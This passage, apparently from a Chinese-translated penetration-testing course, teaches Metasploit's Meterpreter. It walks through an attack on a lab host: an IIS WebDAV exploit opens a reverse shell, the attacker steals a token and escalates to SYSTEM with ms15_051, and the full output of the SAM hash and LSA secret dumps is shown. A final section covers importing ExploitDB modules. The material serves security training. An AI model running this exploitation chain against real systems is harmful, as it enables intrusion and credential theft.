 --  ----                    -------                    ------------
 0   Exploit: multi/handler  generic/shell_reverse_tcp  tcp://10.10.14.34:4444
```

接下来，我们将使用极其强大的`Meterpreter`有效负载。

# 计价器

------

Payload`Meterpreter`是一种特定类型的多方面、可扩展的 Payload，用于`DLL injection`确保与受害主机的连接稳定且难以使用简单检查进行检测，并且可以配置为在重启或系统更改时保持不变。此外，Meterpreter 完全驻留在远程主机的内存中，不会在硬盘上留下任何痕迹，因此很难用传统的取证技术进行检测。

它被称为渗透测试的瑞士军刀，这是有充分理由的。Meterpreter 的目的是专门改进我们的后开发程序，为我们提供一组精心挑选的相关工具，以便从内部更直接地枚举目标主机。它可以帮助我们找到各种特权升级技术、AV 规避技术、进一步的漏洞研究、提供持久访问、枢轴等。

对于一些有趣的阅读，请查看这篇关于Meterpreter 无阶段有效载荷的[文章和这篇关于修改 Metasploit 模板以进行规避的](https://blog.rapid7.com/2015/03/25/stageless-meterpreter-payloads/)[文章](https://www.blackhillsinfosec.com/modifying-metasploit-x64-template-for-av-evasion)。这些主题超出了本模块的范围，但我们应该意识到这些可能性。

------

## 运行 Meterpreter

要运行 Meterpreter，我们只需要从输出中选择它的任何版本`show payloads`，同时考虑到我们正在攻击的连接类型和操作系统。

漏洞利用完成后，会发生以下事件：

- 目标执行初始阶段。这通常是 bind、reverse、findtag、passivex 等。
- stager 加载以 Reflective 为前缀的 DLL。反射存根处理 DLL 的加载/注入。
- Meterpreter 核心初始化，通过套接字建立 AES 加密链接，并发送 GET。Metasploit 收到此 GET 并配置客户端。
- 最后，Meterpreter 加载扩展。如果模块授予管理权限，它将始终加载`stdapi`和加载。`priv`所有这些扩展都是通过 AES 加密加载的。

每当 Meterpreter Payload 被发送并在目标系统上运行时，我们都会收到一个`Meterpreter shell`. 然后我们可以立即发出`help`命令来查看 Meterpreter shell 的功能。

#### MSF - Meterpreter 命令

 MSF - Meterpreter 命令

```shell-session
meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    disable_unicode_encoding  Disables encoding of unicode strings
    enable_unicode_encoding   Enables encoding of unicode strings
    exit                      Terminate the meterpreter session
    get_timeouts              Get the current session timeout values
    guid                      Get the session GUID
    help                      Help menu
    info                      Displays information about a Post module
    irb                       Open an interactive Ruby shell on the current session
    load                      Load one or more meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the session
    migrate                   Migrate the server to another process
    pivot                     Manage pivot listeners
    pry                       Open the Pry debugger on the current session
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    secure                    (Re)Negotiate TLV packet encryption on the session
    sessions                  Quickly switch to another session
    set_timeouts              Set the current session timeout values
    sleep                     Force Meterpreter to go quiet, then re-establish session.
    transport                 Change the current transport mechanism
    use                       Deprecated alias for "load"
    uuid                      Get the UUID for the current session
    write                     Writes data to a channel
```

其中一些命令也可在模块备忘单中找到以供参考。

我们需要了解 Meterpreter 的主要思想是，它与在目标操作系统上获得直接 shell 一样好，但具有更多功能。Meterpreter 的开发人员为该项目设定了明确的设计目标，以期在未来的可用性上飙升。Meterpreter 需要：

- 隐身
- 强大的
- 可扩展

------

## 隐身

Meterpreter 在启动并到达目标后，完全驻留在内存中，不会向磁盘写入任何内容。当 Meterpreter 将自己注入到受感染的进程中时，也不会创建新进程。此外，它可以执行从一个正在运行的进程到另一个运行进程的进程迁移。

使用现在更新的 msfconsole-v6，目标主机和我们之间的所有 Meterpreter 有效负载通信都使用 AES 加密，以确保数据通信的机密性和完整性。

所有这些都提供了有限的取证证据，而且对受害机器的影响也很小。

------

## 强大的

Meterpreter 在目标主机和攻击者之间使用通道化通信系统证明非常有用。当我们通过为它打开一个专用通道立即在我们的 Meterpreter 阶段内生成一个主机操作系统 shell 时，我们可以直接注意到这一点。这也允许使用 AES 加密流量。

------

## 可扩展

Meterpreter 的功能可以在运行时不断增强并通过网络加载。其模块化结构还允许在不重建的情况下添加新功能。

------

## 使用 Meterpreter

我们已经在有效载荷部分深入研究了 Meterpreter 的基础知识。现在，我们将了解 Meterpreter shell 的真正优势，以及它如何提高评估的有效性并在交战期间节省时间。我们首先对已知目标运行基本扫描。我们将按单点方式执行此操作，从 msfconsole 内部执行所有操作，以便从对我们目标的数据跟踪中获益。

#### MSF - 扫描目标

 MSF - 扫描目标

```shell-session
msf6 > db_nmap -sV -p- -T5 -A 10.10.10.15

[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-03 09:55 UTC
[*] Nmap: Nmap scan report for 10.10.10.15
[*] Nmap: Host is up (0.021s latency).
[*] Nmap: Not shown: 65534 filtered ports
[*] Nmap: PORT   STATE SERVICE VERSION
[*] Nmap: 80/tcp open  http    Microsoft IIS httpd 6.0
[*] Nmap: | http-methods:
[*] Nmap: |_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
[*] Nmap: |_http-server-header: Microsoft-IIS/6.0
[*] Nmap: |_http-title: Under Construction
[*] Nmap: | http-webdav-scan:
[*] Nmap: |   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
[*] Nmap: |   WebDAV type: Unknown
[*] Nmap: |   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
[*] Nmap: |   Server Date: Thu, 03 Sep 2020 09:56:46 GMT
[*] Nmap: |_  Server Type: Microsoft-IIS/6.0
[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 59.74 seconds


msf6 > hosts

Hosts
=====

address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------      ---  ----  -------  ---------  -----  -------  ----  --------
10.10.10.15             Unknown                    device         


msf6 > services

Services
========

host         port  proto  name  state  info
----         ----  -----  ----  -----  ----
10.10.10.15  80    tcp    http  open   Microsoft IIS httpd 6.0
```

接下来，我们查找有关此框上运行的服务的一些信息。具体来说，我们想要探索端口 80 以及那里托管了哪种 Web 服务。

我们注意到这是一个正在建设中的网站——在这里看不到任何与网络相关的内容。但是，仔细查看网页的末尾和 Nmap 扫描的结果，我们注意到服务器正在运行`Microsoft IIS httpd 6.0`。因此，我们朝着这个方向进一步研究，寻找此版本 IIS 的常见漏洞。经过一番搜索，我们找到了以下标记表示一个广泛存在的漏洞：`CVE-2017-7269`. 它还具有为其开发的 Metasploit 模块。

#### MSF - 寻找漏洞

 MSF - 寻找漏洞

```shell-session
msf6 > search iis_webdav_upload_asp

Matching Modules
================

   #  Name                                       Disclosure Date  Rank       Check  Description
   -  ----                                       ---------------  ----       -----  -----------
   0  exploit/windows/iis/iis_webdav_upload_asp  2004-12-31       excellent  No     Microsoft IIS WebDAV Write Access Code Execution


msf6 > use 0

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp


msf6 exploit(windows/iis/iis_webdav_upload_asp) > show options

Module options (exploit/windows/iis/iis_webdav_upload_asp):

   Name          Current Setting        Required  Description
   ----          ---------------        --------  -----------
   HttpPassword                         no        The HTTP password to specify for authentication
   HttpUsername                         no        The HTTP username to specify for authentication
   METHOD        move                   yes       Move or copy the file on the remote system from .txt -> .asp (Accepted: move, copy)
   PATH          /metasploit%RAND%.asp  yes       The path to attempt to upload
   Proxies                              no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                               yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT         80                     yes       The target port (TCP)
   SSL           false                  no        Negotiate SSL/TLS for outgoing connections
   VHOST                                no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.239.181   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

我们继续设置所需的参数。目前，这些将是`LHOST`并且`RHOST`目标上的所有其他内容似乎都在运行默认配置。

#### MSF - 配置漏洞利用和有效载荷

 MSF - 配置漏洞利用和有效载荷

```shell-session
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set RHOST 10.10.10.15

RHOST => 10.10.10.15


msf6 exploit(windows/iis/iis_webdav_upload_asp) > set LHOST tun0

LHOST => tun0


msf6 exploit(windows/iis/iis_webdav_upload_asp) > run

[*] Started reverse TCP handler on 10.10.14.26:4444 
[*] Checking /metasploit28857905.asp
[*] Uploading 612435 bytes to /metasploit28857905.txt...
[*] Moving /metasploit28857905.txt to /metasploit28857905.asp...
[*] Executing /metasploit28857905.asp...
[*] Sending stage (175174 bytes) to 10.10.10.15
[*] Deleting /metasploit28857905.asp (this doesn't always work)...
[!] Deletion failed on /metasploit28857905.asp [403 Forbidden]
[*] Meterpreter session 1 opened (10.10.14.26:4444 -> 10.10.10.15:1030) at 2020-09-03 10:10:21 +0000

meterpreter > 
```

我们有 Meterpreter shell。但是，请仔细查看上面的输出。此时我们可以看到目标系统上存在一个`.asp`名为 exists 的文件。`metasploit28857905`一旦获得 Meterpreter shell，如前所述，它将驻留在内存中。因此，不需要该文件，并且尝试删除`msfconsole`，但由于访问权限而失败。留下这样的痕迹对攻击者没有好处，并且会造成巨大的责任。

从系统管理员的角度来看，找到与此名称类型相匹配的文件或它的轻微变体可以证明有助于在其轨道中间停止攻击。如上所述，针对文件名或签名的正则表达式匹配甚至不允许攻击者在被正确配置的安全措施切断之前生成 Meterpreter shell。

我们继续我们的探索。在尝试查看我们在哪个用户上运行时，我们收到一条访问被拒绝的消息。我们应该尝试将我们的进程迁移到具有更多权限的用户。

#### MSF - Meterpreter 迁移

 MSF - Meterpreter 迁移

```shell-session
meterpreter > getuid

[-] 1055: Operation failed: Access is denied.


meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]                                                
 4     0     System                                                          
 216   1080  cidaemon.exe                                                    
 272   4     smss.exe                                                        
 292   1080  cidaemon.exe                                                    
<...SNIP...>

 1712  396   alg.exe                                                         
 1836  592   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 1920  396   dllhost.exe                                                     
 2232  3552  svchost.exe        x86   0                                      C:\WINDOWS\Temp\rad9E519.tmp\svchost.exe
 2312  592   wmiprvse.exe                                                    
 3552  1460  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 3624  592   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
 4076  1080  cidaemon.exe                                                    


meterpreter > steal_token 1836

Stolen token with username: NT AUTHORITY\NETWORK SERVICE


meterpreter > getuid

Server username: NT AUTHORITY\NETWORK SERVICE
```

现在我们已经在系统中至少建立了一些权限级别，是时候升级该权限了。因此，我们四处寻找任何有趣的东西，并在该`C:\Inetpub\`位置找到一个有趣的文件夹，名为`AdminScripts`. 然而，不幸的是，我们无权阅读其中的内容。

#### MSF - 与目标交互

我们可以很容易地决定运行本地漏洞利用建议模块，将其附加到当前活动的 Meterpreter 会话。为此，我们将当前 Meterpreter 会话置于后台，搜索我们需要的模块，并将 SESSION 选项设置为 Meterpreter 会话的索引号，将模块绑定到它。

#### MSF - 会话处理

 MSF - 会话处理

```shell-session
meterpreter > bg

Background session 1? [y/N]  y


msf6 exploit(windows/iis/iis_webdav_upload_asp) > search local_exploit_suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester


msf6 exploit(windows/iis/iis_webdav_upload_asp) > use 0
msf6 post(multi/recon/local_exploit_suggester) > show options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits


msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1

SESSION => 1


msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.15 - Collecting local exploits for x86/windows...
[*] 10.10.10.15 - 34 exploit checks are being tried...
nil versions are discouraged and will be deprecated in Rubygems 4
[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
msf6 post(multi/recon/local_exploit_suggester) > 
```

运行侦察模块为我们提供了多种选择。通过每个单独的一个，我们降落在`ms15_051_client_copy_image`条目上，这被证明是成功的。这个漏洞利用让我们直接进入 root shell，让我们完全控制目标系统。

#### MSF——特权升级

 MSF——特权升级

```shell-session
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms15_051_client_copy_images

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp


msf6 exploit(windows/local/ms15_051_client_copy_image) > show options

Module options (exploit/windows/local/ms15_051_client_copy_image):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     46.101.239.181   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86


msf6 exploit(windows/local/ms15_051_client_copy_image) > set session 1

session => 1


msf6 exploit(windows/local/ms15_051_client_copy_image) > set LHOST tun0

LHOST => tun0


msf6 exploit(windows/local/ms15_051_client_copy_image) > run

[*] Started reverse TCP handler on 10.10.14.26:4444 
[*] Launching notepad to host the exploit...
[+] Process 844 launched.
[*] Reflectively injecting the exploit DLL into 844...
[*] Injecting exploit into 844...
[*] Exploit injected. Injecting payload into 844...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175174 bytes) to 10.10.10.15
[*] Meterpreter session 2 opened (10.10.14.26:4444 -> 10.10.10.15:1031) at 2020-09-03 10:35:01 +0000


meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM
```

从这里开始，我们可以继续使用 Meterpreter 的大量功能。例如，提取哈希值、模拟我们想要的任何进程等等。

#### MSF - 转储哈希

 MSF - 转储哈希

```shell-session
meterpreter > hashdump

Administrator:500:c74761604a24f0dfd0a9ba2c30e462cf:d6908f022af0373e9e21b8a241c86dca:::
ASPNET:1007:3f71d62ec68a06a39721cb3f54f04a3b:edc0d5506804653f58964a2376bbd769:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
IUSR_GRANPA:1003:a274b4532c9ca5cdf684351fab962e86:6a981cb5e038b2d8b713743a50d89c88:::
IWAM_GRANPA:1004:95d112c4da2348b599183ac6b1d67840:a97f39734c21b3f6155ded7821d04d16:::
Lakis:1009:f927b0679b3cc0e192410d9b0b40873c:3064b6fc432033870c6730228af7867c:::
SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:8ed3993efb4e6476e4f75caebeca93e6:::


meterpreter > lsa_dump_sam

[+] Running as SYSTEM
[*] Dumping SAM
Domain : GRANNY
SysKey : 11b5033b62a3d2d6bb80a0d45ea88bfb
Local SID : S-1-5-21-1709780765-3897210020-3926566182

SAMKey : 37ceb48682ea1b0197c7ab294ec405fe

RID  : 000001f4 (500)
User : Administrator
  Hash LM  : c74761604a24f0dfd0a9ba2c30e462cf
  Hash NTLM: d6908f022af0373e9e21b8a241c86dca

RID  : 000001f5 (501)
User : Guest

RID  : 000003e9 (1001)
User : SUPPORT_388945a0
  Hash NTLM: 8ed3993efb4e6476e4f75caebeca93e6

RID  : 000003eb (1003)
User : IUSR_GRANPA
  Hash LM  : a274b4532c9ca5cdf684351fab962e86
  Hash NTLM: 6a981cb5e038b2d8b713743a50d89c88

RID  : 000003ec (1004)
User : IWAM_GRANPA
  Hash LM  : 95d112c4da2348b599183ac6b1d67840
  Hash NTLM: a97f39734c21b3f6155ded7821d04d16

RID  : 000003ef (1007)
User : ASPNET
  Hash LM  : 3f71d62ec68a06a39721cb3f54f04a3b
  Hash NTLM: edc0d5506804653f58964a2376bbd769

RID  : 000003f1 (1009)
User : Lakis
  Hash LM  : f927b0679b3cc0e192410d9b0b40873c
  Hash NTLM: 3064b6fc432033870c6730228af7867c
```

#### MSF - Meterpreter LSA 秘密转储

 MSF - Meterpreter LSA 秘密转储

```shell-session
meterpreter > lsa_dump_secrets

[+] Running as SYSTEM
[*] Dumping LSA secrets
Domain : GRANNY
SysKey : 11b5033b62a3d2d6bb80a0d45ea88bfb

Local name : GRANNY ( S-1-5-21-1709780765-3897210020-3926566182 )
Domain name : HTB

Policy subsystem is : 1.7
LSA Key : ada60ee248094ce782807afae1711b2c

Secret  : aspnet_WP_PASSWORD
cur/text: Q5C'181g16D'=F

Secret  : D6318AF1-462A-48C7-B6D9-ABB7CCD7975E-SRV
cur/hex : e9 1c c7 89 aa 02 92 49 84 58 a4 26 8c 7b 1e c2 

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 7a 3b 72 f3 cd ed 29 ce b8 09 5b b0 e2 63 73 8a ab c6 ca 49 2b 31 e7 9a 48 4f 9c b3 10 fc fd 35 bd d7 d5 90 16 5f fc 63 
    full: 7a3b72f3cded29ceb8095bb0e263738aabc6ca492b31e79a484f9cb310fcfd35bdd7d590165ffc63
    m/u : 7a3b72f3cded29ceb8095bb0e263738aabc6ca49 / 2b31e79a484f9cb310fcfd35bdd7d590165ffc63

Secret  : L$HYDRAENCKEY_28ada6da-d622-11d1-9cb9-00c04fb16e75
cur/hex : 52 53 41 32 48 00 00 00 00 02 00 00 3f 00 00 00 01 00 01 00 b3 ec 6b 48 4c ce e5 48 f1 cf 87 4f e5 21 00 39 0c 35 87 88 f2 51 41 e2 2a e0 01 83 a4 27 92 b5 30 12 aa 70 08 24 7c 0e de f7 b0 22 69 1e 70 97 6e 97 61 d9 9f 8c 13 fd 84 dd 75 37 35 61 89 c8 00 00 00 00 00 00 00 00 97 a5 33 32 1b ca 65 54 8e 68 81 fe 46 d5 74 e8 f0 41 72 bd c6 1e 92 78 79 28 ca 33 10 ff 86 f0 00 00 00 00 45 6d d9 8a 7b 14 2d 53 bf aa f2 07 a1 20 29 b7 0b ac 1c c4 63 a4 41 1c 64 1f 41 57 17 d1 6f d5 00 00 00 00 59 5b 8e 14 87 5f a4 bc 6d 8b d4 a9 44 6f 74 21 c3 bd 8f c5 4b a3 81 30 1a f6 e3 71 10 94 39 52 00 00 00 00 9d 21 af 8c fe 8f 9c 56 89 a6 f4 33 f0 5a 54 e2 21 77 c2 f4 5c 33 42 d8 6a d6 a5 bb 96 ef df 3d 00 00 00 00 8c fa 52 cb da c7 10 71 10 ad 7f b6 7d fb dc 47 40 b2 0b d9 6a ff 25 bc 5f 7f ae 7b 2b b7 4c c4 00 00 00 00 89 ed 35 0b 84 4b 2a 42 70 f6 51 ab ec 76 69 23 57 e3 8f 1b c3 b1 99 9e 31 09 1d 8c 38 0d e7 99 57 36 35 06 bc 95 c9 0a da 16 14 34 08 f0 8e 9a 08 b9 67 8c 09 94 f7 22 2e 29 5a 10 12 8f 35 1c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 

Secret  : L$RTMTIMEBOMB_1320153D-8DA3-4e8e-B27B-0D888223A588
cur/hex : 00 f2 d1 31 e2 11 d3 01 

Secret  : L$TermServLiceningSignKey-12d4b7c8-77d5-11d1-8c24-00c04fa3080d

Secret  : L$TermServLicensingExchKey-12d4b7c8-77d5-11d1-8c24-00c04fa3080d

Secret  : L$TermServLicensingServerId-12d4b7c8-77d5-11d1-8c24-00c04fa3080d

Secret  : L$TermServLicensingStatus-12d4b7c8-77d5-11d1-8c24-00c04fa3080d

Secret  : L${6B3E6424-AF3E-4bff-ACB6-DA535F0DDC0A}
cur/hex : ca 66 0b f5 42 90 b1 2b 64 a0 c5 87 a7 db 9a 8a 2e ee da a8 bb f6 1a b1 f4 03 cf 7a f1 7f 4c bc fc b4 84 36 40 6a 34 f9 89 56 aa f4 43 ef 85 58 38 3b a8 34 f0 dc c3 7f 
old/hex : ca 66 0b f5 42 90 b1 2b 64 a0 c5 87 a7 db 9a 8a 2e c8 e9 13 e6 5f 17 a9 42 93 c2 e3 4c 8c c3 59 b8 c2 dd 12 a9 6a b2 4c 22 61 5f 1f ab ab ff 0c e0 93 e2 e6 bf ea e7 16 

Secret  : NL$KM
cur/hex : 91 de 7a b2 cb 48 86 4d cf a3 df ae bb 3d 01 40 ba 37 2e d9 56 d1 d7 85 cf 08 82 93 a2 ce 5f 40 66 02 02 e1 1a 9c 7f bf 81 91 f0 0f f2 af da ed ac 0a 1e 45 9e 86 9f e7 bd 36 eb b2 2a 82 83 2f 

Secret  : SAC

Secret  : SAI

Secret  : SCM:{148f1a14-53f3-4074-a573-e1ccd344e1d0}

Secret  : SCM:{3D14228D-FBE1-11D0-995D-00C04FD919C1}

Secret  : _SC_Alerter / service 'Alerter' with username : NT AUTHORITY\LocalService

Secret  : _SC_ALG / service 'ALG' with username : NT AUTHORITY\LocalService

Secret  : _SC_aspnet_state / service 'aspnet_state' with username : NT AUTHORITY\NetworkService

Secret  : _SC_Dhcp / service 'Dhcp' with username : NT AUTHORITY\NetworkService

Secret  : _SC_Dnscache / service 'Dnscache' with username : NT AUTHORITY\NetworkService

Secret  : _SC_LicenseService / service 'LicenseService' with username : NT AUTHORITY\NetworkService

Secret  : _SC_LmHosts / service 'LmHosts' with username : NT AUTHORITY\LocalService

Secret  : _SC_MSDTC / service 'MSDTC' with username : NT AUTHORITY\NetworkService

Secret  : _SC_RpcLocator / service 'RpcLocator' with username : NT AUTHORITY\NetworkService

Secret  : _SC_RpcSs / service 'RpcSs' with username : NT AUTHORITY\NetworkService

Secret  : _SC_stisvc / service 'stisvc' with username : NT AUTHORITY\LocalService

Secret  : _SC_TlntSvr / service 'TlntSvr' with username : NT AUTHORITY\LocalService

Secret  : _SC_WebClient / service 'WebClient' with username : NT AUTHORITY\LocalService
```

从这一点来看，如果机器连接到更广泛的网络，我们可以使用这个战利品在系统中旋转，获得对内部资源的访问权限，并在网络的整体安全态势薄弱的情况下冒充具有更高访问权限的用户.

## 编写和导入模块

要安装任何已经被其他用户移植过来的新 Metasploit 模块，可以选择`msfconsole`从终端更新它们，这将确保所有最新的漏洞、辅助工具和功能都将安装在最新版本的`msfconsole`. 只要移植的模块被推送到 GitHub 上的主要 Metasploit-framework 分支，我们就应该更新到最新的模块。

但是，如果我们只需要一个特定的模块并且不想执行完整升级，我们可以下载该模块并手动安装。我们将专注于在 ExploitDB 中搜索现成可用的 Metasploit 模块，我们可以将这些模块直接导入到我们的`msfconsole`本地版本中。

在搜索自定义漏洞时，[ExploitDB是一个不错的选择。](https://www.exploit-db.com/)我们可以使用标签来搜索每个可用脚本的不同利用场景。这些标签之一是[Metasploit Framework (MSF)](https://www.exploit-db.com/?tag=3)，如果选中，将仅显示 Metasploit 模块格式中也可用的脚本。这些可以直接从 ExploitDB 下载并安装在我们本地的 Metasploit Framework 目录中，从那里可以在`msfconsole`.

![](使用METASPLOIT框架\3.png)

假设我们想使用为 找到的漏洞利用程序`Nagios3`，它将利用命令注入漏洞。我们正在寻找的模块是`Nagios3 - 'statuswml.cgi' Command Injection (Metasploit)`. 所以我们启动`msfconsole`并尝试搜索那个特定的漏洞利用，但我们找不到它。这意味着我们的 Metasploit 框架不是最新的，或者`Nagios3`我们正在寻找的特定漏洞利用模块不在 Metasploit 框架的官方更新版本中。

#### MSF - 搜索漏洞

 MSF - 搜索漏洞

```shell-session
msf6 > search nagios

Matching Modules
================

   #  Name                                                          Disclosure Date  Rank       Check  Description
   -  ----                                                          ---------------  ----       -----  -----------
   0  exploit/linux/http/nagios_xi_authenticated_rce                2019-07-29       excellent  Yes    Nagios XI Authenticated Remote Command Execution
   1  exploit/linux/http/nagios_xi_chained_rce                      2016-03-06       excellent  Yes    Nagios XI Chained Remote Code Execution
   2  exploit/linux/http/nagios_xi_chained_rce_2_electric_boogaloo  2018-04-17       manual     Yes    Nagios XI Chained Remote Code Execution
   3  exploit/linux/http/nagios_xi_magpie_debug                     2018-11-14       excellent  Yes    Nagios XI Magpie_debug.php Root Remote Code Execution
   4  exploit/linux/misc/nagios_nrpe_arguments                      2013-02-21       excellent  Yes    Nagios Remote Plugin Executor Arbitrary Command Execution
   5  exploit/unix/webapp/nagios3_history_cgi                       2012-12-09       great      Yes    Nagios3 history.cgi Host Command Execution
   6  exploit/unix/webapp/nagios_graph_explorer                     2012-11-30       excellent  Yes    Nagios XI Network Monitor Graph Explorer Component Command Injection
   7  post/linux/gather/enum_nagios_xi                              2018-04-17       normal     No     Nagios XI Enumeration
```

但是，我们可以[在 ExploitDB 的条目中](https://www.exploit-db.com/exploits/9861)找到漏洞利用代码。或者，如果我们不想使用我们的网络浏览器在 ExploitDB 中搜索特定的漏洞，我们可以使用 CLI 版本，`searchsploit`.

 MSF - 搜索漏洞

```shell-session
vnswer77@htb[/htb]$ searchsploit nagios3

--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                               |  Path
--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Nagios3 - 'history.cgi' Host Command Execution (Metasploit)                                                                                  | linux/remote/24159.rb
Nagios3 - 'history.cgi' Remote Command Execution                                                                                             | multiple/remote/24084.py
Nagios3 - 'statuswml.cgi' 'Ping' Command Execution (Metasploit)                                                                              | cgi/webapps/16908.rb
Nagios3 - 'statuswml.cgi' Command Injection (Metasploit)                                                                                     | unix/webapps/9861.rb
--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

请注意，以 结尾的托管文件终止符`.rb`是 Ruby 脚本，很可能是专门为在`msfconsole`. 我们还可以仅按`.rb`文件终止符进行过滤，以避免无法在`msfconsole`. 请注意，并非所有`.rb`文件都会自动转换为`msfconsole`模块。有些漏洞是用 Ruby 编写的，其中没有任何与 Metasploit 模块兼容的代码。我们将在以下小节中查看这些示例之一。

 MSF - 搜索漏洞

```shell-session
vnswer77@htb[/htb]$ searchsploit -t Nagios3 --exclude=".py"

--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                               |  Path
--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Nagios3 - 'history.cgi' Host Command Execution (Metasploit)                                                                                  | linux/remote/24159.rb
Nagios3 - 'statuswml.cgi' 'Ping' Command Execution (Metasploit)                                                                              | cgi/webapps/16908.rb
Nagios3 - 'statuswml.cgi' Command Injection (Metasploit)                                                                                     | unix/webapps/9861.rb
--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

我们必须下载`.rb`文件并将其放在正确的目录中。存储所有模块、脚本、插件和`msfconsole`专有文件的默认目录是`/usr/share/metasploit-framework`. 关键文件夹也在隐藏位置的主文件夹和根文件夹中进行了符号链接`~/.msf4/`。

#### MSF - 目录结构

 MSF - 目录结构

```shell-session
vnswer77@htb[/htb]$ ls /usr/share/metasploit-framework/

app     db             Gemfile.lock                  modules     msfdb            msfrpcd    msf-ws.ru  ruby             script-recon  vendor
config  documentation  lib                           msfconsole  msf-json-rpc.ru  msfupdate  plugins    script-exploit   scripts
data    Gemfile        metasploit-framework.gemspec  msfd        msfrpc           msfvenom   Rakefile   script-password  tools
```

 MSF - 目录结构

```shell-session
vnswer77@htb[/htb]$ ls .msf4/

history  local  logos  logs  loot  modules  plugins  store
```

[我们下载好exploit](https://www.exploit-db.com/exploits/9861)后拷贝到合适的目录下。请注意，我们的主文件夹`.msf4`位置可能不具有该文件夹可能具有的所有文件夹结构`/usr/share/metasploit-framework/`。因此，我们只需要`mkdir`适当的文件夹，使结构与原始文件夹相同，以便`msfconsole`可以找到新模块。之后，我们将继续将`.rb`脚本直接复制到主要位置。

请注意，某些命名约定如果没有得到充分遵守，将在尝试识别`msfconsole`我们安装的新模块时产生错误。始终使用蛇形、字母数字字符和下划线而不是破折号。

例如：

- `nagios3_command_injection.rb`
- `our_module_here.rb`

#### MSF - 在运行时加载附加模块

 MSF - 在运行时加载附加模块

```shell-session
vnswer77@htb[/htb]$ cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb
vnswer77@htb[/htb]$ msfconsole -m /usr/share/metasploit-framework/modules/
```

#### MSF - 加载附加模块

 MSF - 加载附加模块

